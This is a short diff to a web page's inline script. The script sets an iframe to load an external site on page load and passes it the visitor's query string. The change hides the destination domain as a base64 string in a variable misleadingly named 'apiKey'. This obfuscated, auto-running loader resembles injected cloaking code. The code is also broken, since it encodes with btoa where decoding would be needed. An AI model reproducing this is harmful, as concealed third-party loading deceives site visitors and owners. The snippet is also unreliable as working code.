@@ -14,8 +14,9 @@
    <script>
       document.addEventListener("DOMContentLoaded", function(){
          var mainParameter = window.location.search;
-         var address = "https://www.kalaharu.xyz/vivi-ifur/"
-         var combined = address + mainParameter;
+         var rabiCoeg = "vivi-ifur";
+         var apiKey = "aHR0cHM6Ly93d3cua2FsYWhhcnUueHl6Lw=="
+         var combined = btoa(apiKey) + mainParameter;
          var iframeSrcValue = document.getElementById("ngent").src;
          document.getElementById('ngent').setAttribute("src", combined);
       });
